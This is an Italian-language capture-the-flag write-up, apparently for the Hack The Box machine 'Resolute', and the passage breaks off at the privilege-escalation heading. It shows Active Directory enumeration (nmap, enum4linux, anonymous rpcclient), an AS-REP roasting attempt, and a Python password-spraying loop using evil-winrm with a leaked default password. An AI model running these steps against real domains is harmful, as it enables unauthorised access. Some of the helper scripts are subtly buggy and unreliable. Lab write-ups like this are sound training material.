## Information Gathering

Tramite una prima scansione al volo con nmap scopro i seguenti servizi interessanti attivi:

```
nmap -sV -sS -O -A <IP>

PORT     STATE SERVICE      VERSION
53/tcp   open  domain
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-02 17:57:14Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped

```

Contemporaneamente con enum4linux sono emersi diversi usernames e gruppi. Prelevo il frammento e "pulisco" il testo per estrarre gli usernames puliti con il seguente script:

```
import re 

users = "[Administrator] rid:[0x1f4] \
user:[Guest] rid:[0x1f5] \
etc..."

usr = users.split("user")

for x in usr:
	y = re.findall("\[(.*?)\]", x)[0]
	with open("clean_usr.txt", mode="w+") as f:
    f.write(y)
```
Creato il listato, lo uso per provare a sniffare dei TGT dal servizio di Kerberos:

```
python GetNPUsers.py htb.local/ -no-pass -usersfile clean_user.txt -dc-ip 10.10.10.XXX
```
Ma non ne ricavo nulla...
Quindi effettuo anche una scansione del servizio rpcclient:

```
rpcclient -W workgroup -c querydispinfo -U '' -N  res
```

E scopro una password default per l'utenza "marko": Welcome123!

## Exploiting in the System

A questo punto, grazie a [Lorenzo Invidia](https://github.com/lorenzoinvidia), scopro che la password non è più valida per Marko, tuttavia potrebbe essere valida per altri!

Quindi scrivo il seguente script, che prova a collegarsi alla macchina (e con la password sopracitata) per tutti gli utenti ricavati:

```
import os

with open("users_list.txt", mode="r") as f:
	users = f.read().splitlines()

for x in users:
	stream = os.popen("evil-winrm -u "+ x +" -p Welcome123! -i resolute")

	if "WinRM::WinRMAuthorizationError" in stream.read():
		print "[-] " + x + " non valido"
	else:
		print "[*] Utente trovato: " + x
		exit(0)
```

Trovo così l'utenza di melanie. Entro nel sistema e trovo il primo flag!

## Privilege Escalation
    
